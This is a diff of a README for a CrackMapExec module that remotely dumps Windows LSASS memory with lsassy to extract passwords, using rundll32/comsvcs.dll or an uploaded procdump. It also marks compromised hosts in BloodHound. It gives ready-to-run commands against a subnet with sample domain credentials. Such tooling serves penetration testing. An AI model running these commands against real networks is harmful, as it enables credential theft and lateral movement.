@@ -2,7 +2,7 @@
 
 ![CrackMapExec >= 4.0.1](https://img.shields.io/badge/CrackMapExec-%3E=4.0.1-red)
 
-This CME module uses **lsassy** to remotely extract lsass password, and optionnaly interacts with Bloodhound to **set compromised hosts as owned** and check if compromised users have a **path to domain admin**.
+This CME module uses **lsassy** to remotely extract lsass password, and optionally interacts with Bloodhound to **set compromised hosts as owned** and check if compromised users have a **path to domain admin**.
 
 ![CME Module example](/assets/example.png)
 
@@ -40,9 +40,23 @@ python setup.py install
 
 ## Usage
 
+### Basic
+
 ```bash
 cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy
 ```
+
+### Advanced
+
+By default, this module uses rundll32.exe with comsvcs.dll DLL to dump lsass process on the remote host.
+
+If you want to use procdump.exe instead, you just have to tell where it is installed on your system so the module can upload it to the remote server
+
+```bash
+cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy -o PROCDUMP_PATH=/opt/Sysinternals/procdump.exe
+```
+
+### BloodHound
 
 You can set BloodHound integration using `-o BLOODHOUND=True` flag. This flag enables different checks :
 * Set "owned" on BloodHound computer nodes that are compromised
@@ -60,8 +74,7 @@ cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy --
 
             TMP_DIR             Path where process dump should be saved on target system (default: C:\\Windows\\Temp\\)
             SHARE               Share to upload procdump and dump lsass (default: C$)
-            PROCDUMP_PATH       Path where procdump.exe is on your system (default: /tmp/)
-            PROCDUMP_EXE_NAME   Name of the procdump executable (default: procdump.exe)
+            PROCDUMP_PATH       Path to procdump on attacker host. If this is not set, "rundll32" method is used
             REMOTE_LSASS_DUMP   Name of the remote lsass dump (default: tmp.dmp)
             BLOODHOUND          Enable Bloodhound integration (default: false)
             NEO4JURI            URI for Neo4j database (default: 127.0.0.1)
@@ -70,12 +83,6 @@ cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy --
             NEO4JPASS           Password for Neo4j database (default: 'neo4j')
             WITHOUT_EDGES       List of black listed edges (example: 'SQLAdmin,CanRDP', default: '')
 
-```
-
-Options can be set using
-
-```bash
-cme smb dc01.adsec.local -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy -o PROCDUMP_PATH='/home/pixis/Tools/' PROCDUMP_EXE_NAME='procdump.exe'
 ```
 
 ## Issue
